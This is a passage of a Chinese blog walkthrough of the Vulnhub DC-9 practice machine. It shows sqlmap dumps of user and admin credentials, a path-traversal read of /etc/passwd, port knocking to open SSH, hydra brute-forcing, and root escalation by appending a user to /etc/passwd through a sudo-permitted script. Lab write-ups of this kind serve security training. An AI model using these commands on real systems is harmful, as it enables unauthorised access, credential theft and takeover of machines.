<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀hacker)-[~]</span><br><span class="line">└─# sqlmap -r DC-9-request.txt --batch -D users -T UserDetails --dump</span><br><span class="line">Database: users</span><br><span class="line">Table: UserDetails</span><br><span class="line">[17 entries]</span><br><span class="line">+----+------------+---------------+---------------------+-----------+-----------+</span><br><span class="line">| id | lastname   | password      | reg_date            | username  | firstname |</span><br><span class="line">+----+------------+---------------+---------------------+-----------+-----------+</span><br><span class="line">| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |</span><br><span class="line">| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |</span><br><span class="line">| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |</span><br><span class="line">| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |</span><br><span class="line">| 5  | Cat        | TC&amp;TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |</span><br><span class="line">| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |</span><br><span class="line">| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |</span><br><span class="line">| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |</span><br><span class="line">| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |</span><br><span class="line">| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |</span><br><span class="line">| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |</span><br><span class="line">| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |</span><br><span class="line">| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |</span><br><span class="line">| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |</span><br><span class="line">| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |</span><br><span class="line">| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |</span><br><span class="line">| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |</span><br><span class="line">+----+------------+---------------+---------------------+-----------+-----------+</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC123.png"></p>
<p>再来看看Staff这个数据库的，cmd5解密得到admin密码：transorbital1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀hacker)-[~]</span><br><span class="line">└─# sqlmap -r DC-9-request.txt --batch -D Staff --tables</span><br><span class="line">Database: Staff</span><br><span class="line">[2 tables]</span><br><span class="line">+--------------+</span><br><span class="line">| StaffDetails |</span><br><span class="line">| Users        |</span><br><span class="line">+--------------+</span><br><span class="line"> </span><br><span class="line">┌──(root💀hacker)-[~]</span><br><span class="line">└─# sqlmap -r DC-9-request.txt --batch -D Staff -T Users --dump</span><br><span class="line">Database: Staff</span><br><span class="line">Table: Users</span><br><span class="line">[1 entry]</span><br><span class="line">+--------+----------------------------------+----------+</span><br><span class="line">| UserID | Password                         | Username |</span><br><span class="line">+--------+----------------------------------+----------+</span><br><span class="line">| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |</span><br><span class="line">+--------+----------------------------------+----------+</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC124.png"></p>
<p>成功登录后台并且发现底部提示<code>File does not exist</code></p>
<p><img src="/../imgs/Vulnhub-DC125.png"></p>
<p>于是我们尝试文件包含发现可以成功读取到<code>/etc/passwd</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC126.png"></p>
<p>接着根据前面nmap扫的结果ssh 22端口被过滤了，可能有某种机制可以触发从而允许进入，于是我们检查端口敲击序列，找到了<code>/etc/knockd.conf</code>文件如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">22/tcp filtered ssh</span><br><span class="line"> </span><br><span class="line">[options] UseSyslog</span><br><span class="line"> </span><br><span class="line">[openSSH] </span><br><span class="line">sequence = 7469,8475,9842 </span><br><span class="line">seq_timeout = 25 </span><br><span class="line">command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT </span><br><span class="line">tcpflags = syn </span><br><span class="line"> </span><br><span class="line">[closeSSH] </span><br><span class="line">sequence = 9842,8475,7469 </span><br><span class="line">seq_timeout = 25 </span><br><span class="line">command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT </span><br><span class="line">tcpflags = syn</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC127.png"></p>
<p>然后我们需要按照端口顺序7469,8475,9842使用knock命令进行端口碰撞，再使用nmap扫描查看是否打开了ssh</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">knock 192.168.150.155 7469 8475 9842</span><br><span class="line">nmap -p22 192.168.150.155</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC128.png"></p>
<p>再根据前面UserDetails表中得到的账密通过hydra进行爆破可知有三个用户可以登录ssh</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀hacker)-[~]</span><br><span class="line">└─# hydra -L users.txt -P pass.txt 192.168.150.155 ssh</span><br><span class="line">[DATA] attacking ssh://192.168.150.155:22/</span><br><span class="line">[22][ssh] host: 192.168.150.155   login: chandlerb   password: UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.150.155   login: joeyt   password: Passw0rd</span><br><span class="line">[22][ssh] host: 192.168.150.155   login: janitor   password: Ilovepeepee</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC129.png"></p>
<p>接着在janitor用户中发现<code>passwords-found-on-post-it-notes.txt</code>文本如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC130.png"></p>
<p>于是再通过hydra进行爆破又得到一组账密fredf&#x2F;B4-Tru3-001，该用户很可能对后面提权有帮助</p>
<p><img src="/../imgs/Vulnhub-DC131.png"></p>
<p>ssh登录fredf用户，执行一下<code>sudo -l</code>发现可以在没有密码的情况下以root身份运行test</p>
<p><img src="/../imgs/Vulnhub-DC132.png"></p>
<p>但是这里跑了下test发现不能直接执行，需要用到<code>test.py</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Usage: python test.py read append</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC133.png"></p>
<p>于是使用find命令查找一下<code>test.py</code>发现就在<code>/opt/devstuff</code>目录下存在<code>test.py</code>，看下代码得知它是在读取一个文件，并将1中的内容加到2上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff/dist/test$ find / -name &quot;test.py&quot; -type f 2&gt;/dev/null</span><br><span class="line">/opt/devstuff/test.py</span><br><span class="line">/usr/lib/python3/dist-packages/setuptools/command/test.py</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC134.png"></p>
<p>接着我们尝试利用<code>test</code>将一个具有root权限的用户写入到<code>/etc/passwd</code>实现提权。</p>
<p>首先利用openssl来生成一个加盐的账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀hacker)-[~]</span><br><span class="line">└─# openssl passwd -1 -salt salt password</span><br><span class="line">$1$salt$qJH7.N4xYta3aEG/dfqo/0</span><br></pre></td></tr></table></figure>

<p>然后切换到<code>/tmp</code>目录下，将具有root权限的用户信息写入到<code>/tmp/root</code>文件中，再将<code>/tmp/root</code>写入<code>/etc/passwd</code>，此时切换用户即可成功提权得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;harvey:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash&#x27; &gt;&gt; root</span><br><span class="line">sudo /opt/devstuff/dist/test/test /tmp/root /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/Vulnhub-DC135.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://mssnharvey.github.io">Harvey</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://mssnharvey.github.io/2023/12/11/Vulnhub-DC/">https://mssnharvey.github.io/2023/12/11/Vulnhub-DC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://mssnharvey.github.io" target="_blank">MssnHarvey</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Vulnhub/">Vulnhub</a></div><div class="post-share"><div class="social-share" data-image="/../imgs/Vulnhub-DC.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2024/03/14/tomcat%E5%AE%9E%E7%8E%B0%E5%9B%BD%E5%AF%86ssl/" title="tomcat实现国密ssl"><img class="cover" src="/../imgs/tomcatssl.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">tomcat实现国密ssl</div></div></div></a><a class="pagination-related  no-desc" href="/2023/12/10/vulnstack4/" title="ATT&amp;CK红队评估实战靶场四"><img class="cover" src="/../imgs/vulnstack4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">ATT&CK红队评估实战靶场四</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Harvey</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">39</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/MssnHarvey/" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:mssnharvey@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Bro, you're under arrest.</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-1"><span class="toc-number">1.</span> <span class="toc-text">DC-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.1.</span> <span class="toc-text">准备工作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-2"><span class="toc-number">2.</span> <span class="toc-text">DC-2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1"><span class="toc-number">2.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-3"><span class="toc-number">3.</span> <span class="toc-text">DC-3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-2"><span class="toc-number">3.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB-2"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E6%B8%97%E9%80%8F"><span class="toc-number">3.3.</span> <span class="toc-text">Web渗透</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-4"><span class="toc-number">4.</span> <span class="toc-text">DC-4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">4.2.</span> <span class="toc-text">web渗透</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-5"><span class="toc-number">5.</span> <span class="toc-text">DC-5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">5.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB-3"><span class="toc-number">5.2.</span> <span class="toc-text">漏洞攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-6"><span class="toc-number">6.</span> <span class="toc-text">DC-6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="toc-number">6.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB-4"><span class="toc-number">6.2.</span> <span class="toc-text">漏洞攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-7"><span class="toc-number">7.</span> <span class="toc-text">DC-7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3"><span class="toc-number">7.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB-5"><span class="toc-number">7.2.</span> <span class="toc-text">漏洞攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-8"><span class="toc-number">8.</span> <span class="toc-text">DC-8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-4"><span class="toc-number">8.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB-6"><span class="toc-number">8.2.</span> <span class="toc-text">漏洞攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-9"><span class="toc-number">9.</span> <span class="toc-text">DC-9</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-5"><span class="toc-number">9.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB-7"><span class="toc-number">9.2.</span> <span class="toc-text">漏洞攻击</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Harvey</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'

  const createScriptElement = config => {
    const ele = document.createElement('script')
    Object.entries(config).forEach(([key, value]) => {
      ele.setAttribute(key, value)
    })
    return ele
  }

  const loadGiscus = (el = document, key) => {
    const mappingConfig = isShuoshuo
      ? { 'data-mapping': 'specific', 'data-term': key }
      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }

    const giscusConfig = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'MssnHarvey/Giscus',
      'data-repo-id': 'R_kgDORNvvEQ',
      'data-category-id': 'DIC_kwDORNvvEc4C2M_B',
      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
      'data-reactions-enabled': '1',
      crossorigin: 'anonymous',
      async: true,
      ...option,
      ...mappingConfig
    }

    const scriptElement = createScriptElement(giscusConfig)

    el.querySelector('#giscus-wrap').appendChild(scriptElement)

    if (isShuoshuo) {
      window.shuoshuoComment.destroyGiscus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const changeGiscusTheme = theme => {
    const iframe = document.querySelector('#giscus-wrap iframe')
    if (iframe) {
      const message = {
        giscus: {
          setConfig: {
            theme: getGiscusTheme(theme)
          }
        }
      }
      iframe.contentWindow.postMessage(message, 'https://giscus.app')
    }
  }

  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')

  if (isShuoshuo) {
    'Giscus' === 'Giscus'
      ? window.shuoshuoComment = { loadComment: loadGiscus }
      : window.loadOtherComment = loadGiscus
    return
  }

  if ('Giscus' === 'Giscus' || !true) {
    if (true) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
    else loadGiscus()
  } else {
    window.loadOtherComment = loadGiscus
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>